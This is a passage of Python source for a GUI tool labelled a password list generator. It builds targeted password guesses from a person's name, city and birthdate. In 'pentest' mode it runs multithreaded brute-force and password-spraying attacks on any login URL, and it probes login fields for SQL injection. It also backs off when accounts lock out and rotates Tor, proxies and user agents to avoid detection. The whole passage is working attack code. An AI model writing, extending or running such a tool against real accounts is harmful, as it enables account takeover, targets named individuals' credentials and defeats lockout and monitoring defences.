        self.var_spray_cooldown_min.set(float(profile.get("spray_cooldown_min", 15.0)))
        self.var_spray_window_min.set(float(profile.get("spray_window_min", 60.0)))
        self.var_spray_attempts_per_window.set(int(profile.get("spray_attempts_per_window", 1)))
        self.var_spray_stop_on_success.set(bool(profile.get("spray_stop_on_success", True)))
        # lockout
        self.var_lockout_enabled.set(bool(profile.get("lockout_enabled", True)))
        self.var_lockout_codes.set(profile.get("lockout_codes", "429,423,403"))
        self.var_lockout_regex.set(profile.get("lockout_regex", "account locked|too many attempts|temporarily blocked|captcha"))
        self.var_lockout_cooldown_min.set(float(profile.get("lockout_cooldown_min", 30.0)))
        self.var_lockout_jitter.set(bool(profile.get("lockout_jitter", True)))
        # rotation load
        self.var_tor_mode.set(bool(profile.get("tor_mode", False)))
        self.var_tor_proxy.set(profile.get("tor_proxy", "socks5h://127.0.0.1:9050"))
        self.var_proxy_list_file.set(profile.get("proxy_list_file", ""))
        if self.var_proxy_list_file.get():
            self.loaded_proxies = self._parse_list_file(self.var_proxy_list_file.get())
        self.var_proxy_rotation.set(profile.get("proxy_rotation", "per_request"))
        self.var_user_agent_rotate.set(bool(profile.get("user_agent_rotate", False)))
        self.var_user_agent_list_file.set(profile.get("user_agent_list_file", ""))
        if self.var_user_agent_list_file.get():
            self.loaded_user_agents = self._parse_list_file(self.var_user_agent_list_file.get())
        self.var_user_agent_rotation.set(profile.get("user_agent_rotation", "per_request"))

        self._info("Profile loaded")

    def _info(self, msg: str) -> None:
        self.status_var.set(msg)
        try:
            if self.use_bootstrap:
                TbMessagebox.show_info("Info", msg)
            else:
                messagebox.showinfo("Info", msg)
        except Exception:
            pass

    def _build_bruteforce_charset(self) -> str:
        combined = (
            self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get()
        )
        seen = set()
        unique_chars = ''.join([c for c in combined if not (c in seen or seen.add(c))])
        if self.var_include_uppercase.get():
            unique_chars += ''.join({c.upper() for c in unique_chars if c.isalpha()})
        if self.var_include_digits.get():
            unique_chars += string.digits
        special = self.var_special_chars.get() or ""
        charset = ''.join(sorted(set(unique_chars + special)))
        return charset

    def _estimate_smart_total(self, min_len: int, max_len: int) -> int:
        tokens = self._smart_tokens()
        base = len(tokens)
        variants_per_token = 6
        suffixes = 40
        combos = 0
        combos += base * variants_per_token
        combos += base * variants_per_token * suffixes
        combos += min(base * base, 2000) * variants_per_token
        combos = int(combos * 0.5)
        return max(1000, min(combos, 5_000_000))

    def _geom_series(self, n: int, a: int, b: int) -> int:
        if n == 1:
            return b - a + 1
        return (n ** (b + 1) - n ** a) // (n - 1)

    def _estimate_smart_bruteforce_total(self, min_len: int, max_len: int) -> int:
        charset = self._build_bruteforce_charset()
        if charset:
            freq = {}
            for ch in (self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get() + self.var_special_chars.get()):
                if not ch:
                    continue
                freq[ch] = freq.get(ch, 0) + 1
            sorted_chars = [c for c, _ in sorted(freq.items(), key=lambda kv: kv[1], reverse=True)]
            reduced = ''.join(sorted(set((sorted_chars + list(charset)))))
            charset = ''.join(list(reduced)[:12])
        n = len(charset)
        return self._geom_series(n, min_len, max_len) if n > 0 else 0

    def _worker(self, args: dict) -> None:
        try:
            mode = args["mode"]
            min_len = args["min_len"]
            max_len = args["max_len"]
            gzip_out = args["gzip"]
            output_path = args["output_path"]
            pentest = args.get("pentest", {"enabled": False})

            if pentest.get("enabled"):
                completed, msg = self._worker_pentest(mode, min_len, max_len, pentest)
                self.ui_queue.put(("done", completed, msg))
                return

            # File output path
            try:
                if gzip_out:
                    f = gzip.open(output_path, "wt", encoding="utf-8")
                else:
                    f = open(output_path, "w", encoding="utf-8")
            except Exception as exc:
                self.ui_queue.put(("message", f"Failed to open output file: {exc}"))
                self.ui_queue.put(("done", 0, "Failed"))
                return

            completed = 0
            sample_sent = 0
            start = self.start_time or time.time()

            try:
                if mode == "Brute-force":
                    charset = self._build_bruteforce_charset()
                    total = self._geom_series(len(charset), min_len, max_len)
                    self.total_estimated = total
                    for L in range(min_len, max_len + 1):
                        if self.cancel_requested:
                            break
                        for tup in itertools.product(charset, repeat=L):
                            if self.cancel_requested:
                                break
                            pwd = ''.join(tup)
                            f.write(pwd + "\n")
                            completed += 1
                            if sample_sent < 50:
                                self.ui_queue.put(("sample", pwd))
                                sample_sent += 1
                            if completed % 5000 == 0:
                                elapsed = time.time() - start
                                self.ui_queue.put(("progress", completed, self.total_estimated, elapsed))
                elif mode == "Smart brute-force":
                    self.total_estimated = self._estimate_smart_bruteforce_total(min_len, max_len)
                    for pwd in self._smart_bruteforce_candidates(min_len, max_len):
                        if self.cancel_requested:
                            break
                        f.write(pwd + "\n")
                        completed += 1
                        if sample_sent < 50:
                            self.ui_queue.put(("sample", pwd))
                            sample_sent += 1
                        if completed % 5000 == 0:
                            elapsed = time.time() - start
                            self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
                else:
                    for pwd in self._smart_candidates(min_len, max_len):
                        if self.cancel_requested:
                            break
                        f.write(pwd + "\n")
                        completed += 1
                        if sample_sent < 50:
                            self.ui_queue.put(("sample", pwd))
                            sample_sent += 1
                        if completed % 5000 == 0:
                            elapsed = time.time() - start
                            self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), elapsed))
            finally:
                try:
                    f.close()
                except Exception:
                    pass

            self.ui_queue.put(("progress", completed, max(self.total_estimated, completed), time.time() - start))
            self.ui_queue.put(("done", completed, f"Completed. Generated {completed:,} candidates. Saved to: {output_path}"))
        except Exception as exc:
            self.ui_queue.put(("log", f"Worker crashed: {exc}"))
            self.ui_queue.put(("done", 0, "Failed"))

    def _parse_list_file(self, path: str) -> list[str]:
        try:
            lines: list[str] = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    w = line.strip()
                    if w:
                        lines.append(w)
            return lines
        except Exception as exc:
            self.ui_queue.put(("log", f"Failed to read list file {path}: {exc}"))
            return []

    def _collect_usernames(self, fallback_username: str) -> list[str]:
        usernames: list[str] = []
        # From single value
        if fallback_username:
            usernames.append(fallback_username)
        # From loaded file
        usernames.extend(self.loaded_usernames)
        # From patterns
        if self.var_generate_patterns.get():
            patterns = self._generate_username_patterns()
            usernames.extend(patterns)
        # Common aliases
        if self.var_common_aliases.get():
            usernames.extend(["admin", "administrator", "user", "test", "guest", "root"])
        # Deduplicate
        clean = []
        seen = set()
        for u in usernames:
            u2 = u.strip()
            if not u2:
                continue
            if self.var_lowercase_usernames.get():
                u2 = u2.lower()
            if u2 not in seen:
                seen.add(u2)
                clean.append(u2)
        return clean

    def _generate_username_patterns(self) -> list[str]:
        first = (self.var_name.get() or "").strip().split(" ")[0] if (self.var_name.get() or "").strip() else ""
        last = (self.var_surname.get() or "").strip().split(" ")[-1] if (self.var_surname.get() or "").strip() else ""
        if not first and not last:
            return []
        f = first[:1]
        l = last[:1]
        combos = set([
            first + last,
            first + "." + last,
            f + last,
            first + l,
            f + last,
            last + first,
            last + "." + first,
            first + "_" + last,
            first + "-" + last,
            last + "_" + first,
            last + "-" + first,
        ])
        domain = (self.var_email_domain.get() or "").strip()
        results: list[str] = []
        for c in combos:
            if not c:
                continue
            if domain:
                results.append(f"{c}@{domain}")
            results.append(c)
        return results

    def _smart_tokens(self) -> list[str]:
        tokens: list[str] = []
        base_parts = [self.var_name.get(), self.var_surname.get(), self.var_city.get(), self.var_birthdate.get()]
        for part in base_parts:
            part = (part or "").strip()
            if not part:
                continue
            for t in filter(None, itertools.chain.from_iterable([p.split(sep) for sep in [" ", "-", "_", ".", ",", "/"] for p in [part]])):
                tokens.append(t)
                if t.isdigit() and 2 <= len(t) <= 4:
                    tokens.append(t)
        wordlist_path = os.path.join(os.getcwd(), "wordlist.txt")
        if os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wf:
                    for i, line in enumerate(wf):
                        if i >= 1000:
                            break
                        w = line.strip()
                        if w:
                            tokens.append(w)
            except Exception:
                pass
        seen = set()
        deduped = []
        for t in tokens:
            if t not in seen:
                seen.add(t)
                deduped.append(t)
        return deduped[:2000]

    def _mutate_cases_and_leet(self, token: str) -> list[str]:
        variants = set()
        if not token:
            return []
        s = token
        variants.add(s)
        variants.add(s.lower())
        variants.add(s.upper())
        variants.add(s.capitalize())
        leet_map = str.maketrans({"a": "@", "A": "@", "e": "3", "E": "3", "i": "1", "I": "1", "o": "0", "O": "0", "s": "5", "S": "5"})
        variants.add(s.translate(leet_map))
        variants.add(s.lower().translate(leet_map))
        return [v for v in variants if v]

    def _smart_candidates(self, min_len: int, max_len: int):
        specials = list(self.var_special_chars.get() or "")
        years = [str(y) for y in range(1970, datetime.now().year + 1)]
        simple_suffixes = ["", "!", "?", ".", "_", "-", "#"]

        tokens = self._smart_tokens()
        variants_cache: dict[str, list[str]] = {}

        def within_bounds(pw: str) -> bool:
            return min_len <= len(pw) <= max_len

        emitted = set()
        count = 0
        limit = 5_000_000

        for t in tokens:
            if count >= limit:
                break
            variants = variants_cache.setdefault(t, self._mutate_cases_and_leet(t))
            for v in variants:
                if count >= limit:
                    break
                if within_bounds(v) and v not in emitted:
                    emitted.add(v); count += 1; yield v
                for suf in itertools.chain(simple_suffixes, specials):
                    if count >= limit:
                        break
                    pw = v + suf
                    if within_bounds(pw) and pw not in emitted:
                        emitted.add(pw); count += 1; yield pw
                for n in range(0, 100):
                    if count >= limit:
                        break
                    pw = f"{v}{n}"
                    if within_bounds(pw) and pw not in emitted:
                        emitted.add(pw); count += 1; yield pw
                for y in years[-50:]:
                    if count >= limit:
                        break
                    pw = f"{v}{y}"
                    if within_bounds(pw) and pw not in emitted:
                        emitted.add(pw); count += 1; yield pw

        for a, b in itertools.islice(itertools.product(tokens, tokens), 0, 2000):
            if count >= limit:
                break
            for av in variants_cache.setdefault(a, self._mutate_cases_and_leet(a)):
                for bv in variants_cache.setdefault(b, self._mutate_cases_and_leet(b)):
                    if count >= limit:
                        break
                    pw = av + bv
                    if within_bounds(pw) and pw not in emitted:
                        emitted.add(pw); count += 1; yield pw
                    for sep in itertools.chain(["", "_", "-", "."], specials):
                        if count >= limit:
                            break
                        pw2 = av + sep + bv
                        if within_bounds(pw2) and pw2 not in emitted:
                            emitted.add(pw2); count += 1; yield pw2

    def _smart_bruteforce_candidates(self, min_len: int, max_len: int):
        base = self._build_bruteforce_charset()
        if not base:
            return
        freq = {}
        for ch in (self.var_name.get() + self.var_surname.get() + self.var_city.get() + self.var_birthdate.get() + self.var_special_chars.get()):
            if not ch:
                continue
            freq[ch] = freq.get(ch, 0) + 1
        prioritized = []
        for c, _ in sorted(freq.items(), key=lambda kv: kv[1], reverse=True):
            if c in base and c not in prioritized:
                prioritized.append(c)
            if len(prioritized) >= 12:
                break
        for c in base:
            if c not in prioritized and len(prioritized) < 12:
                prioritized.append(c)
        charset = ''.join(prioritized)
        for L in range(min_len, max_len + 1):
            for tup in itertools.product(charset, repeat=L):
                yield ''.join(tup)

    # Pentest helpers and worker
    def _parse_codes(self, csv_codes: str) -> set[int]:
        result: set[int] = set()
        for part in (csv_codes or "").split(','):
            part = part.strip()
            if not part:
                continue
            try:
                result.add(int(part))
            except ValueError:
                pass
        return result or {200, 302}

    def _compile_regex(self, pattern: str):
        if not pattern:
            return None
        try:
            return re.compile(pattern, re.I)
        except re.error:
            return None

    def _parse_extra_params(self, raw: str) -> dict[str, str]:
        params: dict[str, str] = {}
        if not raw:
            return params
        for pair in raw.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                params[k.strip()] = v.strip()
        return params

    def _parse_headers_json(self, raw: str) -> dict[str, str]:
        if not raw:
            return {}
        try:
            obj = json.loads(raw)
            return obj if isinstance(obj, dict) else {}
        except Exception:
            self.ui_queue.put(("log", "Invalid headers JSON; ignoring."))
            return {}

    def _parse_cookies(self, raw: str) -> dict[str, str]:
        result: dict[str, str] = {}
        if not raw:
            return result
        parts = [p.strip() for p in raw.split(';') if p.strip()]
        for p in parts:
            if '=' in p:
                k, v = p.split('=', 1)
                result[k.strip()] = v.strip()
        return result

    def _http_attempt(self, sess: requests.Session, cfg: dict, username: str, password: str, call_headers: dict | None = None, call_proxies: dict | None = None):
        url = cfg['url']
        method = cfg['method']
        user_param = cfg['user_param']
        pass_param = cfg['pass_param']
        extra = dict(cfg.get('extra_params', {}))
        data = {user_param: username, pass_param: password, **extra}
        try:
            if method == 'GET':
                resp = sess.get(url, params=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
            else:
                resp = sess.post(url, data=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
            return resp
        except Exception as exc:
            self.ui_queue.put(("log", f"Request error: {exc}"))
            return None

    def _is_success(self, resp, cfg: dict) -> bool:
        if resp is None:
            return False
        status_ok = (resp.status_code in cfg['success_codes']) if cfg['success_codes'] else True
        text = resp.text or ""
        fail_re = cfg.get('failure_regex')
        succ_re = cfg.get('success_regex')
        if fail_re and fail_re.search(text):
            return False
        if succ_re:
            return bool(succ_re.search(text))
        return status_ok

    def _is_lockout(self, resp, cfg: dict) -> bool:
        if resp is None or not cfg.get('lockout_enabled'):
            return False
        if resp.status_code in (cfg.get('lockout_codes') or set()):
            return True
        lock_re = cfg.get('lockout_regex')
        if lock_re:
            try:
                text = resp.text or ""
            except Exception:
                text = ""
            if lock_re.search(text):
                return True
        return False

    def _configure_session(self, sess: requests.Session, cfg: dict) -> None:
        try:
            if cfg.get('headers'):
                sess.headers.update(cfg['headers'])
            if cfg.get('cookies'):
                sess.cookies.update(cfg['cookies'])
            if cfg.get('proxies'):
                sess.proxies.update(cfg['proxies'])
            sess.verify = cfg.get('verify', True)
        except Exception as exc:
            self.ui_queue.put(("log", f"Session configuration error: {exc}"))

    def _run_sqli_checks(self, sess: requests.Session, cfg: dict) -> tuple[bool, str]:
        field = cfg.get('sqli_field', 'password')
        username = cfg['username']
        self.ui_queue.put(("log", f"[SQLi] Starting checks on {field} field…"))
        limiter = RateLimiter(cfg['qps'])
        for payload in self._sqli_payloads():
            if self.cancel_requested:
                break
            if field == 'username':
                u, p = payload, 'x'
            else:
                u, p = username, payload
            limiter.acquire()
            resp = self._http_attempt(sess, cfg, u, p)
            if self._is_success(resp, cfg):
                msg = f"[SQLi] Possible SQL injection success with {field} payload: {payload!r}"
                self.ui_queue.put(("log", msg))
                return True, msg
            else:
                code = getattr(resp, 'status_code', '?')
                self.ui_queue.put(("log", f"[SQLi] tried: {payload!r} -> status {code}"))
        return False, ""

    def _worker_pentest(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
        completed = 0
        found_msg = ""
        start = self.start_time or time.time()
        limiter = RateLimiter(cfg['qps'])
        total_ref = max(self.total_estimated, 1)

        # Optional SQLi pre-checks (single-thread)
        try:
            base_sess = requests.Session()
            self._configure_session(base_sess, cfg)
            if cfg.get('enable_sqli'):
                ok, msg = self._run_sqli_checks(base_sess, cfg)
                if ok:
                    return completed, msg
        except Exception as exc:
            self.ui_queue.put(("log", f"Pentest setup error: {exc}"))
        finally:
            try:
                base_sess.close()
            except Exception:
                pass

        # Shared lockout state
        lockout_lock = threading.Lock()
        lockout_until = [0.0]  # mutable box

        def wait_if_locked():
            while True:
                if self.cancel_requested:
                    return
                with lockout_lock:
                    t = lockout_until[0]
                now = time.time()
                if now >= t:
                    return
                # sleep a bit until lockout expires
                time.sleep(0.2)

        def trigger_lockout_backoff():
            with lockout_lock:
                base = float(cfg.get('lockout_cooldown_sec', 0.0))
                if cfg.get('lockout_jitter'):
                    # +/- 15% jitter
                    jitter = base * 0.15
                    delay = max(1.0, base + (jitter * (2.0 * (time.time() % 1.0) - 0.5)))
                else:
                    delay = max(1.0, base)
                lockout_until[0] = max(lockout_until[0], time.time() + delay)
            self.ui_queue.put(("log", f"[Lockout] Detected; backing off for ~{int(delay)}s"))

        def run_batch(pair_iterable) -> bool:
            # returns True if success found and stop
            nonlocal completed, found_msg
            q = queue.Queue(maxsize=2000)
            stop_event = threading.Event()
            progress_lock = threading.Lock()
            # rotation state
            proxy_cycle_lock = threading.Lock()
            ua_cycle_lock = threading.Lock()
            proxy_index = [0]
            ua_index = [0]

            def build_proxies_dict(proxy_url: str | None):
                if not proxy_url:
                    return None
                return {'http': proxy_url, 'https': proxy_url}

            def next_proxy_url(for_worker: bool = False) -> str | None:
                # Determine proxy for request/worker
                if cfg.get('tor_mode'):
                    return cfg.get('tor_proxy')
                lst = cfg.get('proxies_list') or []
                if not lst:
                    # fallback to single proxies config
                    p = cfg.get('proxies')
                    if isinstance(p, dict):
                        return p.get('http') or p.get('https')
                    return None
                if cfg.get('proxy_rotation') == 'per_worker' and for_worker:
                    # Assign a stable proxy per worker by index
                    with proxy_cycle_lock:
                        url = lst[proxy_index[0] % len(lst)]
                        proxy_index[0] += 1
                        return url
                # per request
                with proxy_cycle_lock:
                    url = lst[proxy_index[0] % len(lst)]
                    proxy_index[0] += 1
                    return url

            def next_user_agent(for_worker: bool = False) -> str | None:
                if (cfg.get('ua_rotation') or 'none') == 'none':
                    return None
                lst = cfg.get('user_agents') or []
                if not lst:
                    return None
                if cfg.get('ua_rotation') == 'per_worker' and for_worker:
                    with ua_cycle_lock:
                        ua = lst[ua_index[0] % len(lst)]
                        ua_index[0] += 1
                        return ua
                with ua_cycle_lock:
                    ua = lst[ua_index[0] % len(lst)]
                    ua_index[0] += 1
                    return ua

            def producer():
                try:
                    for pair in pair_iterable:
                        if self.cancel_requested or stop_event.is_set():
                            break
                        try:
                            q.put(pair, timeout=0.5)
                        except queue.Full:
                            if self.cancel_requested or stop_event.is_set():
                                break
                            continue
                except Exception as exc:
                    self.ui_queue.put(("log", f"Producer error: {exc}"))
                finally:
                    for _ in range(cfg['concurrency']):
                        try:
                            q.put_nowait((None, None))
                        except Exception:
                            pass

            def worker(worker_id: int):
                nonlocal completed, found_msg
                sess = requests.Session()
                self._configure_session(sess, cfg)
                # Per-worker assignments
                per_worker_proxy = next_proxy_url(for_worker=True) if cfg.get('proxy_rotation') == 'per_worker' else None
                if per_worker_proxy:
                    try:
                        sess.proxies.update(build_proxies_dict(per_worker_proxy) or {})
                    except Exception:
                        pass
                per_worker_ua = next_user_agent(for_worker=True) if cfg.get('ua_rotation') == 'per_worker' else None
                if per_worker_ua:
                    sess.headers['User-Agent'] = per_worker_ua
                try:
                    while not self.cancel_requested and not stop_event.is_set():
                        try:
                            user, pwd = q.get(timeout=0.5)
                        except queue.Empty:
                            continue
                        if user is None:
                            break
                        try:
                            wait_if_locked()
                            if self.cancel_requested or stop_event.is_set():
                                break
                            limiter.acquire()
                            # Per-request overrides
                            call_headers = None
                            call_proxies = None
                            if cfg.get('ua_rotation') == 'per_request':
                                ua = next_user_agent()
                                if ua:
                                    call_headers = dict(sess.headers)
                                    call_headers['User-Agent'] = ua
                            if cfg.get('proxy_rotation') == 'per_request' or cfg.get('tor_mode') or not sess.proxies:
                                purl = next_proxy_url()
                                call_proxies = build_proxies_dict(purl)
                            resp = self._http_attempt(sess, cfg, user, pwd, call_headers=call_headers, call_proxies=call_proxies)
                            # Lockout detection
                            if self._is_lockout(resp, cfg):
                                trigger_lockout_backoff()
                            with progress_lock:
                                completed += 1
                                if completed % 100 == 0:
                                    elapsed = time.time() - start
                                    self.ui_queue.put(("progress", completed, max(total_ref, completed), elapsed))
                                if completed <= 50:
                                    self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
                            if self._is_success(resp, cfg):
                                found_msg = f"SUCCESS: {user} / {pwd}"
                                self.ui_queue.put(("log", found_msg))
                                stop_event.set()
                                break
                        except Exception as exc:
                            self.ui_queue.put(("log", f"Worker {worker_id} error: {exc}"))
                        finally:
                            try:
                                q.task_done()
                            except Exception:
                                pass
                finally:
                    try:
                        sess.close()
                    except Exception:
                        pass

            threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(cfg['concurrency'])]
            prod_thread = threading.Thread(target=producer, daemon=True)
            prod_thread.start()
            for t in threads:
                t.start()
            try:
                q.join()
            except Exception:
                pass
            stop_event.set()
            for t in threads:
                try:
                    t.join(timeout=1.0)
                except Exception:
                    pass
            return stop_event.is_set() and bool(found_msg)

        # Build batches depending on spray setting
        if cfg.get('spray_enabled'):
            usernames = cfg.get('usernames', [])
            for pwd in cfg.get('spray_passwords', []):
                if self.cancel_requested:
                    break
                # Run one round: iterate all usernames for this password
                if run_batch(((u, pwd) for u in usernames)):
                    if cfg.get('spray_stop_on_success', True):
                        break
                # Cooldown between rounds
                cooldown = float(cfg.get('spray_cooldown_sec', 0.0))
                if cooldown > 0 and not self.cancel_requested:
                    end_time = time.time() + cooldown
                    while time.time() < end_time:
                        if self.cancel_requested:
                            break
                        time.sleep(0.5)
        else:
            # Not spraying: iterate password candidates for a single/fixed username list (first one)
            fixed_users = cfg.get('usernames', []) or [cfg.get('username')]
            fixed_user = fixed_users[0]
            if mode == 'Brute-force':
                pw_iter = self._bruteforce_stream(min_len, max_len)
            elif mode == 'Smart brute-force':
                pw_iter = self._smart_bruteforce_candidates(min_len, max_len)
            else:
                pw_iter = self._smart_candidates(min_len, max_len)
            run_batch(((fixed_user, pw) for pw in pw_iter))

        if not found_msg:
            found_msg = f"Pentest run finished. Attempts: {completed:,}. No success criteria met."
        return completed, found_msg

    def _bruteforce_stream(self, min_len: int, max_len: int):
        charset = self._build_bruteforce_charset()
        for L in range(min_len, max_len + 1):
            for tup in itertools.product(charset, repeat=L):
                yield ''.join(tup)

    # UI callbacks
    def on_browse_usernames_file(self) -> None:
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        self.var_usernames_file.set(path)
        self.loaded_usernames = self._parse_list_file(path)
        self.var_usernames_count.set(f"loaded: {len(self.loaded_usernames)}")

    def on_browse_passwords_file(self) -> None:
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        self.var_spray_passwords_file.set(path)

    def on_browse_proxy_list_file(self) -> None:
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        self.var_proxy_list_file.set(path)
        self.loaded_proxies = self._parse_list_file(path)
        self.ui_queue.put(("log", f"Loaded {len(self.loaded_proxies)} proxies"))

    def on_browse_user_agent_list_file(self) -> None:
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        self.var_user_agent_list_file.set(path)
        self.loaded_user_agents = self._parse_list_file(path)
        self.ui_queue.put(("log", f"Loaded {len(self.loaded_user_agents)} user-agents"))

    def on_use_target_domain(self) -> None:
        url = self.var_target_url.get().strip()
        if not url:
            return
        try:
            host = urlparse(url).hostname or ""
            parts = host.split('.') if host else []
            public_suffix_2 = {"co.uk", "com.au", "co.jp", "com.br", "com.tr", "com.mx", "com.ar", "com.sg"}
            domain = ""
            if len(parts) >= 2:
                last_two = ".".join(parts[-2:])
                if last_two in public_suffix_2 and len(parts) >= 3:
                    domain = ".".join(parts[-3:])
                else:
                    domain = last_two
            self.var_email_domain.set(domain)
        except Exception:
            pass

    def _built_in_user_agents(self) -> list[str]:
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]

    def run(self) -> None:
        try:
            self.root.mainloop()
        except Exception as exc:
            # Last-resort graceful exit
            try:
                self.ui_queue.put(("log", f"Fatal UI error: {exc}"))
            except Exception:
                pass
            finally:
                try:
                    self.root.destroy()
                except Exception:
                    os._exit(1)


if __name__ == "__main__":
    app = PasswordListGeneratorApp()
    app.run()
